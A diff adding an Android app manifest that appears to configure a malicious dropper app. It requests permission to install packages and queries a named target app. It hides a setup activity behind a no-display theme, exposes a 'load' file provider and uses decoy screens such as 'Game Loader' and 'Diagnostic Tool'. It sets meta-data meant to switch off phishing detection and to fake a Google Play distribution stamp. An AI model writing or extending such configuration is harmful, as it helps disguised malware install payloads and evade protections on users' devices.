@@ -1,0 +1,122 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
+
+
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+
+
+
+    <queries>
+        <package android:name="target.app.rep" />
+        <intent>
+            <action android:name="*" />
+        </intent>
+    </queries>
+
+    <application
+        android:hardwareAccelerated="false"
+        android:icon="@drawable/myicon"
+        android:roundIcon="@drawable/myicon"
+        android:label="@string/theappname"
+        android:largeHeap="true"
+        android:requestLegacyExternalStorage="true"
+        android:supportsRtl="true"
+        android:theme="@android:style/Theme.Black.NoTitleBar">
+
+        <meta-data android:name="[T_ID].SUPPORT" android:value="true"/>
+        <meta-data android:name="[T_ID].ENABLE" android:value="false"/>
+        <meta-data android:name="[T_ID].level" android:value="HIGH"/>
+
+
+        <activity android:name="com.appd.instll.ConfirmDialog" />
+
+        <activity android:name=".setupWizard"
+            android:theme="@android:style/Theme.NoDisplay"
+            android:exported="false" />
+
+        <activity android:name=".userAgreement"
+            android:theme="@android:style/Theme.DeviceDefault.Light.NoActionBar"
+            android:label="User Agreement"
+            android:exported="false" />
+
+        <activity android:name=".diagnosticTool"
+            android:theme="@android:style/Theme.Black.NoTitleBar"
+            android:label="Diagnostic Tool"
+            android:exported="false" />
+
+        <activity android:name=".analyticsViewer"
+            android:theme="@android:style/Theme.DeviceDefault"
+            android:label="Analytics Viewer"
+            android:exported="false" />
+
+
+
+
+        <activity
+            android:name="com.appd.instll.splash"
+            android:exported="true"
+            android:icon="@drawable/myicon"
+            android:label="@string/theappname"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter>
+
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+
+            </intent-filter>
+
+        </activity>
+
+        <provider
+            android:name="androidx.core.content.FileProvider"
+            android:authorities="com.appd.instll.load.provider"
+            android:exported="false"
+            android:grantUriPermissions="true">
+            <meta-data
+                android:name="android.support.FILE_PROVIDER_PATHS"
+                android:resource="@xml/provider_paths" />
+        </provider>
+
+        <activity android:name=".welcome"
+            android:theme="@android:style/Theme.DeviceDefault"
+            android:label="Welcome Screen"
+            android:exported="false">
+        </activity>
+
+        <activity android:name=".play"
+            android:theme="@android:style/Theme.DeviceDefault"
+            android:label="Game Loader"
+            android:exported="false">
+        </activity>
+
+        <service android:name=".working"
+            android:exported="false"/>
+
+        <service android:name=".scanning"
+            android:exported="false" />
+
+        <receiver android:name=".BroReceiver" android:exported="true">
+            <intent-filter>
+                <action android:name="your.package.ACTION_DELIVER_PI_EVENT" />
+            </intent-filter>
+        </receiver>
+        <meta-data android:name="com.google.android.gms.version" android:value="12451000"/>
+        <meta-data android:name="com.google.android.ALLOW_PHISHING_DETECTION" android:value="false"/>
+        <meta-data android:name="com.sec.android.support.multiwindow" android:value="true"/>
+        <meta-data android:name="com.sec.android.multiwindow.DEFAULT_SIZE_W" android:value="632.0dip"/>
+        <meta-data android:name="com.sec.android.multiwindow.DEFAULT_SIZE_H" android:value="598.0dip"/>
+        <meta-data android:name="com.sec.android.multiwindow.MINIMUM_SIZE_W" android:value="632.0dip"/>
+        <meta-data android:name="com.sec.android.multiwindow.MINIMUM_SIZE_H" android:value="598.0dip"/>
+        <meta-data android:name="com.android.dynamic.apk.fused.modules" android:value="base"/>
+        <meta-data android:name="com.android.vending.splits" android:resource="@xml/splits0"/>
+        <meta-data android:name="com.android.stamp.type" android:value="STAMP_TYPE_DISTRIBUTION_APK"/>
+        <meta-data android:name="com.android.stamp.source" android:value="https://play.google.com/store"/>
+        <meta-data android:name="com.google.android.play.billingclient.version" android:value="3.0.3"/>
+        <meta-data android:name="com.android.vending.derived.apk.id" android:value="1"/>
+    </application>
+
+</manifest>
